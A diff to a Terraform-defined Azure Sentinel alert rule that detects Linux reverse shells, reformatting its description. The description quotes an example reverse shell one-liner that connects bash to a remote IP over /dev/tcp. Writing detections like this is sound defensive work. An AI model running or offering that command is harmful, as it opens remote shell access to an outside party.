@@ -2,7 +2,11 @@ resource "azurerm_sentinel_alert_rule_scheduled" "net_connection_lnx_back_connec
   name                       = "net_connection_lnx_back_connect_shell_dev"
   log_analytics_workspace_id = var.workspace_id
   display_name               = "Linux Reverse Shell Indicator"
-  description                = "Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1') Reference: https://github.com/SigmaHQ/sigma/blob/master/rules/linux/network_connection/net_connection_lnx_back_connect_shell_dev.yml | Source: https://github.com/SigmaHQ/sigma/blob/master/rules/linux/network_connection/net_connection_lnx_back_connect_shell_dev.yml"
+  description                = <<DESC
+    Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')
+
+    Reference: https://github.com/SigmaHQ/sigma/blob/master/rules/linux/network_connection/net_connection_lnx_back_connect_shell_dev.yml
+  DESC
   severity                   = "High"
   query                      = <<QUERY
 DeviceNetworkEvents
